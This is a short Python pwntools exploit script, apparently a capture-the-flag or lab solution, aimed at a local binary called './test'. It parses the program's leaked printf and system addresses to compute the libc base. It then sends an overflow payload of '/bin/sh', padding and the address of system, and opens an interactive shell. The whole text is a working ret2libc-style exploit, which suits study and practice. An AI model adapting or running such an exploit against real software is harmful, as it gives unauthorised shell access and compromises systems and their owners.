from pwn import *
#context.log_level = "debug"
p = process("./test")
p.recvuntil(b"return 0;")
p.recvuntil(b"printf: ")
leak1 = p.recvuntil(b"\n").replace(b"\n", b"").decode()
p.recvuntil(b"printf offset: ")
leak2 = p.recvuntil(b"\n").replace(b"\n", b"").decode()
p.recvuntil(b"system offset: ")
leak3 = p.recvuntil(b"\n").replace(b"\n", b"").decode()
log.info("printf: {}".format(leak1))
log.info("printf offset: {}".format(leak2))
log.info("system offset: {}".format(leak3))

libc = int(leak1, 16) - int(leak2, 16)
system = int(leak3, 16)
log.info(hex(libc))

pl = b'/bin/sh\x00'+b'a'*24+p64(system+libc)
p.sendline(pl)
p.interactive()
